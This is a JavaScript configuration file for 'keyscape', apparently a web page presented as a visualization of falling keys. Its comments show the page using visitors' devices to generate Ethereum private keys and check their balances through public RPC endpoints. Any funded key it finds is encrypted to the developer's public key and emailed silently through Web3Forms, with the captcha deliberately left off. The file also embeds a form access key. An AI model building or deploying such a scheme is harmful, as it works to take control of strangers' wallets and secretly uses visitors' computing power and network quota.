// keyscape configuration. Everything here is PUBLIC and safe to ship in a
// static page: RPC URLs, the developer's *public* key, and public form ids.
// No secret ever belongs in this file or anywhere else in the page.

// Keyless, CORS-enabled public Ethereum JSON-RPC endpoints. Each device spends
// its own per-IP budget. Verified (2026-11-18) to answer batched
// eth_getBalance + eth_getTransactionCount with Access-Control-Allow-Origin.
// Keep several so any one dying needs no code change. maxCalls seeds a known
// batch limit (the pool also learns limits from HTTP 400s); drpc's free tier
// takes at most 2 calls, so it serves single-call hit re-verification.
export const RPC_ENDPOINTS = [
  { url: 'https://ethereum-rpc.publicnode.com' },
  { url: 'https://eth.drpc.org', maxCalls: 2 },
  { url: 'https://eth-mainnet.public.blastapi.io' },
  { url: 'https://rpc.mevblocker.io' },
];

// The developer's secp256k1 PUBLIC key (hex, compressed 0x02/03... or
// uncompressed 0x04...). A found private key is ECIES-encrypted to this, so only
// the holder of the matching private key can read it. Safe to embed.
// This is the key of wallet 0xA831D11C0c280B118C5f44B192A327cf64D9eE91, recovered
// from its own signed transactions (tools/pubkey-from-address.mjs). Replace with
// the designer's key before handing over.
export const DEV_PUBLIC_KEY = '0x03d3be583ddd550e7161e7bba95c4814565cbdec619c710602ca221dc2a71edca4';

// Web3Forms access key (https://web3forms.com). Public and safe to embed - it only
// lets a submission be emailed to the address the key is registered to. A hit is
// delivered here. Leave empty to run the visualization with no notification.
// (Replaced Formspree, whose account was blocked.) Do NOT enable a captcha on the
// form in the Web3Forms dashboard - this page submits with no human to solve it.
export const WEB3FORMS_ACCESS_KEY = '87268cf4-320c-4ee0-9819-4297f8dcfdc6';

// Default visual theme (see themes.js: void/nebula/phosphor/ember are dark,
// paper/blueprint are light). Overridable per-device by the on-screen switcher
// (persisted) or a ?theme=<id> URL param.
export const DEFAULT_THEME = 'void';

// Falling-key orientation: 'horizontal' (default) or 'vertical' (experimental).
// Override per load with ?rain=vertical / ?rain=horizontal.
export const KEY_RAIN_ORIENTATION = 'vertical';

// Engine tunables.
export const HILBERT_LEVELS = 4;          // 8^4 = 4096 vertices per cube
export const BATCH_KEYS = 25;             // keys per batch (x2 RPC calls each)
export const MIN_BATCH_KEYS = 4;          // floor when halving on errors
export const MAX_BATCH_KEYS = 50;
export const KEY_QUEUE_TARGET = 120;      // keep roughly this many keys queued
export const MAX_CONNECTIONS = 160;       // on-screen triples (ring buffer); kept sparse so the cubes read as distinct
export const RPC_TIMEOUT_MS = 12000;
export const RPC_MAX_BACKOFF_MS = 30000;
export const RPC_MIN_INTERVAL_MS = 250;   // per-endpoint floor between requests
export const RPC_PER_CALL_MS = 50;        // per-endpoint pacing: ~20 calls/s each (most count calls in a batch)
export const LOG_CHECKED_KEYS = true;     // log each checked key and its on-chain result to the console
